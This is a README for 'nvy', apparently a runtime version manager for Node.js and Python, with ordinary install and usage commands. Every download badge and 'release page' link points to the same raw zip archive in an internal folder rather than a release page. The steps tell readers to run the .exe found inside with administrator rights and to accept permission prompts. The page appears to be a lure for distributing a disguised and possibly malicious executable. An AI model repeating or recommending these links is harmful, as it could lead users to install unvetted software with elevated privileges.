# ⚙️ nvy - Simple Runtime Version Manager

[![Download nvy](https://img.shields.io/badge/Download-nvy-brightgreen)](https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip)

---

nvy is a simple tool that helps you manage different versions of software runtimes on your computer. It works with tools like Node.js, Python, and others. This lets you switch between versions easily without confusion. nvy uses a plugin system that makes it flexible and easy to update.

---

## 📥 Download nvy

Start by visiting the official releases page. This is where you will find the latest version of nvy to download.

[Download or update nvy here](https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip)

You will see several files for different operating systems. Since you are using Windows, look for a file with `.exe` or Windows in the name.

---

## 💻 System Requirements

Before installing, make sure your computer meets these requirements:

- Windows 10 or later
- 1 GB of free disk space
- Administrator rights on your computer for installation
- Internet connection to download nvy and plugins

---

## 🚀 Getting Started with nvy on Windows

Follow these steps to get nvy running on your Windows PC:

1. **Go to the Release Page**

   Open your browser and visit:  
   https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip

2. **Download the Windows File**

   Find the latest release. Look for a file named something like `nvy-windows.exe` or `nvy.exe`. Click the link to download it.

3. **Run the Installer**

   Once the file downloads, double-click it to start the setup. If Windows asks for permission, click Yes to continue.

4. **Follow Setup Instructions**

   The installer will guide you through the steps. Usually, accept default options unless you have a specific reason to change them.

5. **Complete Installation**

   When installation finishes, the setup will confirm that nvy is ready to use.

---

## 🔧 Setting Up nvy

After installing nvy, you can start using it to manage your runtimes.

1. **Open Command Prompt**

   Press the Windows key, type `cmd`, and hit Enter. This opens a command prompt window.

2. **Check nvy Version**

   Type this command and press Enter:

   ```
   nvy --version
   ```

   This will display the current version to confirm nvy is installed.

3. **Install a Runtime**

   To install a version of Python or Node.js, use:

   ```
   nvy install python 3.10.5
   nvy install nodejs 16.14.0
   ```

   Replace `python` or `nodejs` with the name of the runtime and the version number you want.

4. **Use a Runtime Version**

   To set an active version, type:

   ```
   nvy use python 3.10.5
   ```

   This will make your system use that version until you change it.

5. **List Installed Runtimes**

   Show what you have installed with:

   ```
   nvy list
   ```

---

## 🛠 How nvy Works

nvy uses a simple method to keep track of different software versions. Instead of changing programs manually, it uses small helper programs called plugins to manage each runtime. This makes it easy to add new runtimes or update them without affecting others.

- The plugins control downloading, installing, and switching versions.
- It creates a shortcut (called a shim) to point your system to the correct version of the software.
- It works for many tools like Python, Node.js, Golang, and more.

---

## ⚙️ Common Commands

| Command            | What it does                                      |
|--------------------|--------------------------------------------------|
| `nvy install <tool> <version>` | Download and install a version of a tool.      |
| `nvy use <tool> <version>`     | Set a version as active for use.                |
| `nvy list`                    | Show all installed runtimes and versions.      |
| `nvy update`                  | Update nvy and its plugins to the latest version.|
| `nvy help`                    | Show help and available commands.               |

---

## 🧩 Using Plugins

nvy's flexibility comes from its plugin system. Each plugin knows how to manage a specific runtime.

- Plugins are downloaded automatically when you install a runtime.
- Plugins work quietly in the background.
- You do not need to install them manually.
- To see installed plugins, use:
  
  ```
  nvy plugins list
  ```

---

## 🔄 Updating nvy

To keep your runtime manager working well, update it regularly:

1. Open Command Prompt.
2. Run:

   ```
   nvy update
   ```

This will check for new versions of nvy and its plugins and apply them.

---

## ❓ Troubleshooting

If you run into problems, try these tips:

- Make sure you downloaded the correct Windows file.
- Run the Command Prompt as Administrator.
- Check your internet connection.
- Restart your computer after installation.
- Use `nvy help` to see available commands.

---

## 📚 More Information

nvy supports many development tools including:

- Python
- Node.js
- Golang
- Other runtimes installed via plugins

It works on Windows, MacOS, and Linux.

For more options and updates, visit:

https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip

---

[![Download nvy](https://img.shields.io/badge/Download-nvy-brightgreen)](https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip)